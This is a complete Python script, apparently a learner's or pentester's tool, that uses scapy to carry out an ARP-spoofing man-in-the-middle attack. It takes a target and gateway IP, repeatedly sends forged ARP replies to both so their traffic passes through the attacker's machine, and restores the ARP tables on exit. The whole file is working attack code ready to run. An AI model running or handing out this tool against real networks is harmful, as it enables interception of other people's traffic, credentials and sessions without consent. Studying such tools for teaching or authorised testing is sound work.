#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time


def get_argument():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target", help="Target IP.")
	parser.add_argument("-g", "--geteway", dest="gateway", help="gateway IP.")
	options = parser.parse_args()
	if not options.target:
		parser.error("[-] Please specify an target ip, use --help for more info.")
	elif not options.gateway:
		parser.error("[-] Please specify an gateway ip, use --help for more info.")
	return options


def check_existance(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	if answered_list:
		print(f"[+] {ip} found in the network.")
	else:
		print(f"[-] {ip} not found in the network.")
		exit()

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)


if __name__ == '__main__':

	options = get_argument()

	target_ip = options.target
	gateway_ip = options.gateway

	check_existance(target_ip)
	check_existance(gateway_ip)

	sent_packets_count = 0

	try:
		while True:
			spoof(target_ip, gateway_ip)
			spoof(gateway_ip, target_ip)
			sent_packets_count += 2
			if sent_packets_count == 2:
				print("[+] Successfully established Man In The Middile")
				print("[=] Press CRTL + C to stop.")
			print(f"\r[+] Packets sent : {sent_packets_count}", end="")	
			time.sleep(2)


	except KeyboardInterrupt:
		print("\n[-] Detected CRTL + C ")
		print("[+] Reseting ARP Table... Please wait...")
		restore(target_ip, gateway_ip)
		restore(gateway_ip, target_ip)
